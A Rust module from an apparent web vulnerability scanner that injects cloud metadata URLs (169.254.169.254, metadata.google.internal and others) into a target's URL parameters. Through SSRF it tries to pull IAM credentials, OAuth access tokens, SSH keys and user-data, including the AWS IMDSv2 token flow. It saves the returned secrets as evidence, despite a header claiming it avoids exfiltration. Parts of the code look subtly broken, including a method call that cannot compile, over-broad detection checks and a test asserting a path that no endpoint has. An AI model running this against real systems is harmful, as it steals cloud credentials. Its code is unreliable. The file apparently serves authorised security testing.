//! Cloud Metadata Service Exploitation Module
//!
//! Targets AWS, GCP, Azure, DigitalOcean, Alibaba, and Oracle metadata services
//! (e.g., 169.254.169.254). Strictly scoped to prevent accidental data exfiltration.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Cloud metadata service target
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Alibaba,
    Oracle,
    Generic,
}

impl CloudProvider {
    pub fn metadata_ip(&self) -> &'static str {
        match self {
            CloudProvider::Aws => "169.254.169.254",
            CloudProvider::Gcp => "metadata.google.internal",
            CloudProvider::Azure => "169.254.169.254",
            CloudProvider::DigitalOcean => "169.254.169.254",
            CloudProvider::Alibaba => "100.100.100.200",
            CloudProvider::Oracle => "169.254.169.254",
            CloudProvider::Generic => "169.254.169.254",
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            CloudProvider::Aws => "AWS",
            CloudProvider::Gcp => "GCP",
            CloudProvider::Azure => "Azure",
            CloudProvider::DigitalOcean => "DigitalOcean",
            CloudProvider::Alibaba => "Alibaba Cloud",
            CloudProvider::Oracle => "Oracle Cloud",
            CloudProvider::Generic => "Generic",
        }
    }
}

/// Metadata endpoint definition
#[derive(Debug, Clone)]
pub struct MetadataEndpoint {
    pub provider: CloudProvider,
    pub path: &'static str,
    pub description: &'static str,
    pub sensitivity: MetadataSensitivity,
    pub requires_token: bool,
    pub token_header: Option<&'static str>,
}

/// Sensitivity level of metadata
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum MetadataSensitivity {
    Low,        // Non-sensitive info (region, instance type)
    Medium,     // Network info, IAM roles
    High,       // Credentials, user-data, SSH keys
    Critical,   // Root credentials, private keys
}

/// Cloud metadata exploitation module
pub struct CloudMetadataModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    endpoints: Vec<MetadataEndpoint>,
}

impl CloudMetadataModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            endpoints: Self::define_endpoints(),
        }
    }

    /// Define all cloud metadata endpoints to test
    fn define_endpoints() -> Vec<MetadataEndpoint> {
        vec![
            // AWS IMDSv1
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/",
                description: "AWS metadata root",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/ami-id",
                description: "AWS AMI ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/instance-id",
                description: "AWS Instance ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/instance-type",
                description: "AWS Instance Type",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/local-ipv4",
                description: "AWS Private IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/public-ipv4",
                description: "AWS Public IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/security-groups",
                description: "AWS Security Groups",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/iam/",
                description: "AWS IAM Roles",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/iam/security-credentials/",
                description: "AWS IAM Credentials",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/user-data/",
                description: "AWS User Data",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/dynamic/instance-identity/document",
                description: "AWS Instance Identity Document",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            // AWS IMDSv2 (requires token)
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/api/token",
                description: "AWS IMDSv2 Token",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Aws,
                path: "/latest/meta-data/iam/security-credentials/",
                description: "AWS IAM Credentials (with token)",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: true,
                token_header: Some("X-aws-ec2-metadata-token"),
            },
            
            // GCP
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/",
                description: "GCP Metadata Root",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/project/project-id",
                description: "GCP Project ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/id",
                description: "GCP Instance ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/zone",
                description: "GCP Zone",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/machine-type",
                description: "GCP Machine Type",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/network-interfaces/",
                description: "GCP Network Interfaces",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/service-accounts/",
                description: "GCP Service Accounts",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/service-accounts/default/token",
                description: "GCP Access Token",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/attributes/",
                description: "GCP Instance Attributes",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Gcp,
                path: "/computeMetadata/v1/instance/attributes/ssh-keys",
                description: "GCP SSH Keys",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            
            // Azure
            MetadataEndpoint {
                provider: CloudProvider::Azure,
                path: "/metadata/instance?api-version=2021-02-01",
                description: "Azure Instance Metadata",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Azure,
                path: "/metadata/instance/compute?api-version=2021-02-01",
                description: "Azure Compute Metadata",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Azure,
                path: "/metadata/instance/network?api-version=2021-02-01",
                description: "Azure Network Metadata",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Azure,
                path: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                description: "Azure Access Token",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Azure,
                path: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
                description: "Azure Key Vault Token",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            
            // DigitalOcean
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1.json",
                description: "DigitalOcean Metadata JSON",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/id",
                description: "DigitalOcean Droplet ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/region",
                description: "DigitalOcean Region",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/interfaces/public/0/ipv4/address",
                description: "DigitalOcean Public IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/interfaces/private/0/ipv4/address",
                description: "DigitalOcean Private IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/ssh-keys",
                description: "DigitalOcean SSH Keys",
                sensitivity: MetadataSensitivity::Critical,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::DigitalOcean,
                path: "/metadata/v1/user-data",
                description: "DigitalOcean User Data",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            
            // Alibaba Cloud
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/",
                description: "Alibaba Metadata Root",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/instance-id",
                description: "Alibaba Instance ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/region-id",
                description: "Alibaba Region ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/zone-id",
                description: "Alibaba Zone ID",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/private-ipv4",
                description: "Alibaba Private IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/public-ipv4",
                description: "Alibaba Public IP",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Alibaba,
                path: "/latest/meta-data/ram-role/",
                description: "Alibaba RAM Role",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
            
            // Oracle Cloud
            MetadataEndpoint {
                provider: CloudProvider::Oracle,
                path: "/opc/v2/instance/",
                description: "Oracle Instance Metadata",
                sensitivity: MetadataSensitivity::Low,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Oracle,
                path: "/opc/v2/identity/",
                description: "Oracle Identity Metadata",
                sensitivity: MetadataSensitivity::Medium,
                requires_token: false,
                token_header: None,
            },
            MetadataEndpoint {
                provider: CloudProvider::Oracle,
                path: "/opc/v2/instance/metadata/",
                description: "Oracle Custom Metadata",
                sensitivity: MetadataSensitivity::High,
                requires_token: false,
                token_header: None,
            },
        ]
    }

    /// Test a single metadata endpoint
    async fn test_endpoint(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        endpoint: &MetadataEndpoint,
        base_ip: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        let url = format!("http://{}{}", base_ip, endpoint.path);
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&url));
        
        let mut request = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000));

        // Add required headers for GCP
        if endpoint.provider == CloudProvider::Gcp {
            request = request.header("Metadata-Flavor", "Google");
        }
        
        // Add required headers for Azure
        if endpoint.provider == CloudProvider::Azure {
            request = request.header("Metadata", "true");
        }

        let response = request.send().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check if response contains metadata
        if self.is_metadata_response(&body, &headers, status, endpoint) {
            let evidence = self.create_evidence(&test_url, &body, &headers, status, endpoint, &url);
            let severity = match endpoint.sensitivity {
                MetadataSensitivity::Low => FindingSeverity::Medium,
                MetadataSensitivity::Medium => FindingSeverity::High,
                MetadataSensitivity::High => FindingSeverity::High,
                MetadataSensitivity::Critical => FindingSeverity::Critical,
            };

            let finding = Finding::new(
                "cloud_metadata_ssrf",
                severity,
                format!("Cloud Metadata SSRF ({})", endpoint.provider.name()),
                format!("SSRF allows access to {} metadata: {}", endpoint.provider.name(), endpoint.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(url)
            .with_evidence(evidence)
            .with_confidence(90)
            .with_tags(vec!["ssrf", "cloud-metadata", endpoint.provider.name().to_lowercase().as_str(), "metadata-exposure"])
            .with_cwe("CWE-918")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Test IMDSv2 token flow for AWS
    async fn test_aws_imdsv2(
        &self,
        ctx: &CheckContext,
        param_name: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        // Step 1: Get token
        let token_url = "http://169.254.169.254/latest/api/token";
        let token_test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(token_url));
        
        let token_response = self.http_client
            .put(&token_test_url)
            .header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
            .timeout(Duration::from_millis(5000))
            .send()
            .await;

        let token = match token_response {
            Ok(resp) if resp.status().is_success() => {
                resp.text().await.ok()
            }
            _ => None,
        };

        if let Some(token) = token {
            // Step 2: Use token to access sensitive metadata
            let creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
            let creds_test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(creds_url));
            
            let creds_response = self.http_client
                .get(&creds_test_url)
                .header("X-aws-ec2-metadata-token", &token)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = creds_response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_metadata_response(&body, &headers, status, &MetadataEndpoint {
                    provider: CloudProvider::Aws,
                    path: "/latest/meta-data/iam/security-credentials/",
                    description: "AWS IAM Credentials (IMDSv2)",
                    sensitivity: MetadataSensitivity::Critical,
                    requires_token: true,
                    token_header: Some("X-aws-ec2-metadata-token"),
                }) {
                    let evidence = self.create_evidence(&creds_test_url, &body, &headers, status, 
                        &MetadataEndpoint {
                            provider: CloudProvider::Aws,
                            path: "/latest/meta-data/iam/security-credentials/",
                            description: "AWS IAM Credentials (IMDSv2)",
                            sensitivity: MetadataSensitivity::Critical,
                            requires_token: true,
                            token_header: Some("X-aws-ec2-metadata-token"),
                        }, creds_url);
                    
                    let finding = Finding::new(
                        "cloud_metadata_ssrf_imdsv2",
                        FindingSeverity::Critical,
                        "Cloud Metadata SSRF (AWS IMDSv2)",
                        format!("SSRF allows access to AWS IAM credentials via IMDSv2 token flow"),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(format!("Token: {}, URL: {}", token, creds_url))
                    .with_evidence(evidence)
                    .with_confidence(95)
                    .with_tags(vec!["ssrf", "cloud-metadata", "aws", "imdsv2", "iam-credentials"])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Check if response contains cloud metadata
    fn is_metadata_response(
        &self,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        endpoint: &MetadataEndpoint,
    ) -> bool {
        if !status.is_success() && status != 404 && status != 403 {
            return false;
        }

        let body_str = String::from_utf8_lossy(body);
        
        // Check for empty or error responses
        if body_str.trim().is_empty() || body_str.len() < 5 {
            return false;
        }

        // Provider-specific validation
        match endpoint.provider {
            CloudProvider::Aws => {
                // AWS metadata typically returns plain text or JSON
                body_str.contains("ami-") || 
                body_str.contains("i-") || 
                body_str.contains("instance") ||
                body_str.contains("security-credential") ||
                body_str.contains("AccessKeyId") ||
                body_str.contains("SecretAccessKey") ||
                body_str.contains("Token") ||
                body_str.contains("Expiration") ||
                (status == 200 && body_str.len() > 10)
            }
            CloudProvider::Gcp => {
                // GCP requires Metadata-Flavor header and returns JSON
                headers.iter().any(|(k, v)| k.to_lowercase() == "metadata-flavor" && v == "Google") ||
                body_str.contains("project-id") ||
                body_str.contains("instance-id") ||
                body_str.contains("zone") ||
                body_str.contains("machine-type") ||
                body_str.contains("service-accounts") ||
                body_str.contains("access_token") ||
                body_str.contains("ssh-keys") ||
                (status == 200 && body_str.len() > 10)
            }
            CloudProvider::Azure => {
                // Azure requires Metadata header and returns JSON
                headers.iter().any(|(k, v)| k.to_lowercase() == "content-type" && v.contains("application/json")) &&
                (body_str.contains("compute") || body_str.contains("network") || body_str.contains("identity") ||
                 body_str.contains("access_token") || body_str.contains("client_id") ||
                 body_str.contains("subscription_id") || body_str.contains("resource_group"))
            }
            CloudProvider::DigitalOcean => {
                // DigitalOcean returns JSON
                body_str.contains("droplet_id") ||
                body_str.contains("region") ||
                body_str.contains("interfaces") ||
                body_str.contains("ssh_keys") ||
                body_str.contains("user_data") ||
                body_str.contains("vpcs") ||
                (status == 200 && body_str.len() > 10)
            }
            CloudProvider::Alibaba => {
                // Alibaba returns plain text or JSON
                body_str.contains("instance-id") ||
                body_str.contains("region-id") ||
                body_str.contains("zone-id") ||
                body_str.contains("private-ipv4") ||
                body_str.contains("public-ipv4") ||
                body_str.contains("ram-role") ||
                (status == 200 && body_str.len() > 10)
            }
            CloudProvider::Oracle => {
                // Oracle returns JSON
                body_str.contains("instance") ||
                body_str.contains("identity") ||
                body_str.contains("metadata") ||
                body_str.contains("compartment_id") ||
                body_str.contains("availability_domain") ||
                (status == 200 && body_str.len() > 10)
            }
            CloudProvider::Generic => {
                // Generic check for any metadata-like response
                body_str.contains("instance") ||
                body_str.contains("metadata") ||
                body_str.contains("credential") ||
                body_str.contains("token") ||
                body_str.contains("ssh") ||
                (status == 200 && body_str.len() > 50)
            }
        }
    }

    /// Create evidence for metadata finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        endpoint: &MetadataEndpoint,
        payload_url: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Cloud metadata SSRF: provider={}, endpoint={}, sensitivity={:?}, payload_url={}", 
                endpoint.provider.name(), endpoint.path, endpoint.sensitivity, payload_url),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 90,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for CloudMetadataModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Cloud Metadata SSRF module initialized with {} endpoints", self.endpoints.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "cloud_metadata_ssrf",
                "Cloud Metadata Service SSRF",
                "Targets AWS, GCP, Azure, DigitalOcean, Alibaba, and Oracle metadata services",
                Severity::Critical,
                CheckCategory::ServerSideRequestForgery,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["ssrf", "cloud-metadata", "aws", "gcp", "azure", "digitalocean", "alibaba", "oracle", "imdsv2"])
            .with_references(vec![
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
                "https://cloud.google.com/compute/docs/metadata/overview",
                "https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service",
                "https://docs.digitalocean.com/products/droplets/how-to/metadata/",
                "https://www.alibabacloud.com/help/en/elastic-compute-service/latest/metadata",
                "https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(200);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test each cloud provider's metadata endpoints
        let providers = [
            CloudProvider::Aws,
            CloudProvider::Gcp,
            CloudProvider::Azure,
            CloudProvider::DigitalOcean,
            CloudProvider::Alibaba,
            CloudProvider::Oracle,
        ];

        for provider in &providers {
            let base_ip = provider.metadata_ip();
            let provider_endpoints: Vec<_> = self.endpoints.iter()
                .filter(|e| e.provider == *provider)
                .collect();

            for endpoint in provider_endpoints {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }

                    if let Some(finding) = self.test_endpoint(&ctx, param, endpoint, base_ip).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }

            // Test AWS IMDSv2 token flow
            if *provider == CloudProvider::Aws {
                for param in &params {
                    if request_count >= max_requests {
                        break;
                    }

                    if let Some(finding) = self.test_aws_imdsv2(&ctx, param).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        20 // High priority - critical findings
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_ssrf"]
    }
}

impl CloudMetadataModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloud_provider_metadata_ip() {
        assert_eq!(CloudProvider::Aws.metadata_ip(), "169.254.169.254");
        assert_eq!(CloudProvider::Gcp.metadata_ip(), "metadata.google.internal");
        assert_eq!(CloudProvider::Azure.metadata_ip(), "169.254.169.254");
        assert_eq!(CloudProvider::DigitalOcean.metadata_ip(), "169.254.169.254");
        assert_eq!(CloudProvider::Alibaba.metadata_ip(), "100.100.100.200");
        assert_eq!(CloudProvider::Oracle.metadata_ip(), "169.254.169.254");
    }

    #[test]
    fn test_metadata_sensitivity_ordering() {
        assert!(MetadataSensitivity::Low < MetadataSensitivity::Medium);
        assert!(MetadataSensitivity::Medium < MetadataSensitivity::High);
        assert!(MetadataSensitivity::High < MetadataSensitivity::Critical);
    }

    #[test]
    fn test_define_endpoints() {
        let endpoints = CloudMetadataModule::define_endpoints();
        
        assert!(!endpoints.is_empty());
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::Aws));
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::Gcp));
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::Azure));
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::DigitalOcean));
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::Alibaba));
        assert!(endpoints.iter().any(|e| e.provider == CloudProvider::Oracle));
        
        // Check for critical endpoints
        assert!(endpoints.iter().any(|e| e.path.contains("iam/security-credentials") && e.sensitivity == MetadataSensitivity::Critical));
        assert!(endpoints.iter().any(|e| e.path.contains("user-data") && e.sensitivity == MetadataSensitivity::High));
        assert!(endpoints.iter().any(|e| e.path.contains("ssh-keys") && e.sensitivity == MetadataSensitivity::Critical));
        assert!(endpoints.iter().any(|e| e.path.contains("access_token") && e.sensitivity == MetadataSensitivity::Critical));
    }

    #[test]
    fn test_is_metadata_response_aws() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = CloudMetadataModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("ami-12345678");
        let headers = vec![];
        let endpoint = MetadataEndpoint {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/ami-id",
            description: "Test",
            sensitivity: MetadataSensitivity::Low,
            requires_token: false,
            token_header: None,
        };
        
        assert!(module.is_metadata_response(&body, &headers, 200, &endpoint));
    }

    #[test]
    fn test_is_metadata_response_gcp() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = CloudMetadataModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from(r#"{"project-id": "test-project"}"#);
        let headers = vec![("Metadata-Flavor".to_string(), "Google".to_string())];
        let endpoint = MetadataEndpoint {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/project/project-id",
            description: "Test",
            sensitivity: MetadataSensitivity::Low,
            requires_token: false,
            token_header: None,
        };
        
        assert!(module.is_metadata_response(&body, &headers, 200, &endpoint));
    }
}